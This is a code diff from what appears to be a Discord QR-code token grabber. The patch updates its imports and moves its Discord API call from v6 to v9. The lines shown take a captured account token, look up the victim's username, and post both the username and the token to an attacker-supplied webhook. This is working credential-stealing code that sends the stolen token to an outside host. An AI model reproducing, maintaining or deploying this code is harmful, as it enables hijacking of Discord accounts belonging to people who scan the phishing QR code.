@@ -17,7 +17,7 @@ from selenium import webdriver
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-from util.plugins.common import clear, print_slow, getheaders, THIS_VERSION
+from util.plugins.common import getheaders
 
 def logo_qr():
     #Paste the discord logo onto the QR code
@@ -117,7 +117,7 @@ def QR_Grabber(Webhook):
         }
     return token;
                 ''')
-            j = requests.get("https://discordapp.com/api/v6/users/@me", headers=getheaders(token)).json()
+            j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
             a = j['username'] + "#" + j['discriminator']
             requests.post(Webhook, json = {"content" : f"**Username:** {a}\n**Token:** `{token}`"})
             break
